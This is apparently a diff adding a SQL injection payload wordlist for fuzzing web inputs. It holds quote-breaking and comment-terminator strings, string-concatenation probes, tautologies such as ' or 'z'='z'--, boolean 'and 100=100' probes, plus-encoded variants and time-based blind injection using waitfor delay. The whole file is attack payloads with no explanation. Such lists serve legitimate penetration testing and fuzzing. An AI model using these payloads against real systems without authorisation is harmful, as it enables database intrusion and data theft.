@@ -1,0 +1,288 @@
+'":;/\|#$%^&*()!@~`-_+=.
+
+'
+'--
+'#
+'//
+'/*
+';--
+';#
+';//
+';/*
+
+''
+''--
+''#
+''//
+''/*
+'';--
+'';#
+'';//
+'';/*
+
+arv+ind'
+arv+ind'--
+arv+ind'#
+arv+ind'//
+arv+ind'/*
+arv+ind';--
+arv+ind';#
+arv+ind';//
+arv+ind';/*
+
+arv+ind''
+arv+ind''--
+arv+ind''#
+arv+ind''//
+arv+ind''/*
+arv+ind'';--
+arv+ind'';#
+arv+ind'';//
+arv+ind'';/*
+
+CONCAT(arv,ind,')
+CONCAT(arv,ind,'--)
+CONCAT(arv,ind,'#)
+CONCAT(arv,ind,'//)
+CONCAT(arv,ind,'/*)
+CONCAT(arv,ind,';--)
+CONCAT(arv,ind,';#)
+CONCAT(arv,ind,';//)
+CONCAT(arv,ind,';/*)
+
+CONCAT(arv,ind,'')
+CONCAT(arv,ind,''--)
+CONCAT(arv,ind,''#)
+CONCAT(arv,ind,''//)
+CONCAT(arv,ind,''/*)
+CONCAT(arv,ind,'';--)
+CONCAT(arv,ind,'';#)
+CONCAT(arv,ind,'';//)
+CONCAT(arv,ind,'';/*)
+
+arv||ind'
+arv||ind'--
+arv||ind'#
+arv||ind'//
+arv||ind'/*
+arv||ind';--
+arv||ind';#
+arv||ind';//
+arv||ind';/*
+
+arv||ind''
+arv||ind''--
+arv||ind''#
+arv||ind''//
+arv||ind''/*
+arv||ind'';--
+arv||ind'';#
+arv||ind'';//
+arv||ind'';/*
+
+arvind'
+arvind'--
+arvind'#
+arvind'//
+arvind'/*
+arvind';--
+arvind';#
+arvind';//
+arvind';/*
+
+arvind''
+arvind''--
+arvind''#
+arvind''//
+arvind''/*
+arvind'';--
+arvind'';#
+arvind'';//
+arvind'';/*
+
+arv'+'ind
+arv'||'ind
+CONCAT(arv','ind)
+arv''+''ind
+arv''||''ind
+CONCAT(arv'',''ind)
+
+or 100=100
+or 100=100--
+or 100=100#
+or 100=100//
+or 100=100/*
+or 100=100;--
+or 100=100;#
+or 100=100;//
+or 100=100;/*
+
+or 'z'='z'
+or 'z'='z'--
+or 'z'='z'#
+or 'z'='z'//
+or 'z'='z'/*
+or 'z'='z';--
+or 'z'='z';#
+or 'z'='z';//
+or 'z'='z';/*
+
+' or 100=100
+' or 100=100--
+' or 100=100#
+' or 100=100//
+' or 100=100/*
+' or 100=100;--
+' or 100=100;#
+' or 100=100;//
+' or 100=100;/*
+
+' or 'z'='z'
+' or 'z'='z'--
+' or 'z'='z'#
+' or 'z'='z'//
+' or 'z'='z'/*
+' or 'z'='z';--
+' or 'z'='z';#
+' or 'z'='z';//
+' or 'z'='z';/*
+
+arvind and 100=100
+arvind and 100=100--
+arvind and 100=100#
+arvind and 100=100//
+arvind and 100=100/*
+arvind and 100=100;--
+arvind and 100=100;#
+arvind and 100=100;//
+arvind and 100=100;/*
+
+arvind and 'z'='z'
+arvind and 'z'='z'--
+arvind and 'z'='z'#
+arvind and 'z'='z'//
+arvind and 'z'='z'/*
+arvind and 'z'='z';--
+arvind and 'z'='z';#
+arvind and 'z'='z';//
+arvind and 'z'='z';/*
+
+arvind' and 100=100
+arvind' and 100=100--
+arvind' and 100=100#
+arvind' and 100=100//
+arvind' and 100=100/*
+arvind' and 100=100;--
+arvind' and 100=100;#
+arvind' and 100=100;//
+arvind' and 100=100;/*
+
+arvind' and 'z'='z'
+arvind' and 'z'='z'--
+arvind' and 'z'='z'#
+arvind' and 'z'='z'//
+arvind' and 'z'='z'/*
+arvind' and 'z'='z';--
+arvind' and 'z'='z';#
+arvind' and 'z'='z';//
+arvind' and 'z'='z';/*
+
+or+100=100
+or+100=100--
+or+100=100#
+or+100=100//
+or+100=100/*
+or+100=100;--
+or+100=100;#
+or+100=100;//
+or+100=100;/*
+
+or+'z'='z'
+or+'z'='z'--
+or+'z'='z'#
+or+'z'='z'//
+or+'z'='z'/*
+or+'z'='z';--
+or+'z'='z';#
+or+'z'='z';//
+or+'z'='z';/*
+
+'+or+100=100
+'+or+100=100--
+'+or+100=100#
+'+or+100=100//
+'+or+100=100/*
+'+or+100=100;--
+'+or+100=100;#
+'+or+100=100;//
+'+or+100=100;/*
+
+'+or+'z'='z'
+'+or+'z'='z'--
+'+or+'z'='z'#
+'+or+'z'='z'//
+'+or+'z'='z'/*
+'+or+'z'='z';--
+'+or+'z'='z';#
+'+or+'z'='z';//
+'+or+'z'='z';/*
+
+arvind+and+100=100
+arvind+and+100=100--
+arvind+and+100=100#
+arvind+and+100=100//
+arvind+and+100=100/*
+arvind+and+100=100;--
+arvind+and+100=100;#
+arvind+and+100=100;//
+arvind+and+100=100;/*
+
+arvind+and+'z'='z'
+arvind+and+'z'='z'--
+arvind+and+'z'='z'#
+arvind+and+'z'='z'//
+arvind+and+'z'='z'/*
+arvind+and+'z'='z';--
+arvind+and+'z'='z';#
+arvind+and+'z'='z';//
+arvind+and+'z'='z';/*
+
+arvind'+and+100=100
+arvind'+and+100=100--
+arvind'+and+100=100#
+arvind'+and+100=100//
+arvind'+and+100=100/*
+arvind'+and+100=100;--
+arvind'+and+100=100;#
+arvind'+and+100=100;//
+arvind'+and+100=100;/*
+
+arvind'+and+'z'='z'
+arvind'+and+'z'='z'--
+arvind'+and+'z'='z'#
+arvind'+and+'z'='z'//
+arvind'+and+'z'='z'/*
+arvind'+and+'z'='z';--
+arvind'+and+'z'='z';#
+arvind'+and+'z'='z';//
+arvind'+and+'z'='z';/*
+
+' waitfor delay '00:00:10'
+' waitfor delay '00:00:10'--
+' waitfor delay '00:00:10'#
+' waitfor delay '00:00:10'//
+' waitfor delay '00:00:10'/*
+' waitfor delay '00:00:10';--
+' waitfor delay '00:00:10';#
+' waitfor delay '00:00:10';//
+' waitfor delay '00:00:10';/*
+
+'+waitfor+delay+'00:00:10'
+'+waitfor+delay+'00:00:10'--
+'+waitfor+delay+'00:00:10'#
+'+waitfor+delay+'00:00:10'//
+'+waitfor+delay+'00:00:10'/*
+'+waitfor+delay+'00:00:10';--
+'+waitfor+delay+'00:00:10';#
+'+waitfor+delay+'00:00:10';//
+'+waitfor+delay+'00:00:10';/*
